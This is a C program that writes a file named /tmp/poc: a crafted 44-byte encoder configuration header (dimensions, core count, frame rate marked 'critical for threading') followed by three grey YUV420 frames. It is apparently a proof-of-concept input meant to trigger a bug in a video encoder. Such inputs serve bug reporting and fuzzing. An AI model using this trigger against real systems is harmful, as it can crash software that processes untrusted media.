#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main() {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    // Header: 44 bytes
    uint32_t width = 176;
    uint32_t height = 144;
    
    // Bytes 0-3: width (little-endian)
    fputc(width & 0xFF, f);
    fputc((width >> 8) & 0xFF, f);
    fputc((width >> 16) & 0xFF, f);
    fputc((width >> 24) & 0xFF, f);
    
    // Bytes 4-7: height (little-endian)
    fputc(height & 0xFF, f);
    fputc((height >> 8) & 0xFF, f);
    fputc((height >> 16) & 0xFF, f);
    fputc((height >> 24) & 0xFF, f);
    
    // Byte 8: color format (IV_YUV_420 = 0)
    fputc(0x00, f);
    
    // Byte 9: arch type (ARM_NONEON = 0)
    fputc(0x00, f);
    
    // Byte 10: rc mode (RC_MODE_0 = 0)
    fputc(0x00, f);
    
    // Byte 11: num B frames = 0
    fputc(0x00, f);
    
    // Byte 12: frame rate = 30 (critical for threading)
    fputc(0x1E, f);
    
    // Byte 13: num cores = 2 (gives 3 cores: (2 & 0x07) + 1 = 3)
    fputc(0x02, f);
    
    // Bytes 14-17: bitrate (100000 = 0x0186A0, little-endian)
    fputc(0xA0, f);
    fputc(0x86, f);
    fputc(0x01, f);
    fputc(0x00, f);
    
    // Bytes 18-19: QP values
    fputc(0x1E, f); // i_qp = 30
    fputc(0x1E, f); // p_qp = 30
    
    // Byte 20: b_qp = 30
    fputc(0x1E, f);
    
    // Bytes 21-43: padding (23 bytes of zeros)
    for (int i = 0; i < 23; i++) {
        fputc(0x00, f);
    }
    
    // Write 3 frames of YUV420 data
    uint32_t y_size = width * height;           // 25344
    uint32_t uv_size = (width/2) * (height/2);  // 6336 each
    
    for (int frame = 0; frame < 3; frame++) {
        // Y plane
        for (uint32_t i = 0; i < y_size; i++) {
            fputc(0x80, f);  // mid-gray luma
        }
        // U plane
        for (uint32_t i = 0; i < uv_size; i++) {
            fputc(0x80, f);  // mid-gray chroma
        }
        // V plane
        for (uint32_t i = 0; i < uv_size; i++) {
            fputc(0x80, f);  // mid-gray chroma
        }
    }
    
    fclose(f);
    return 0;
}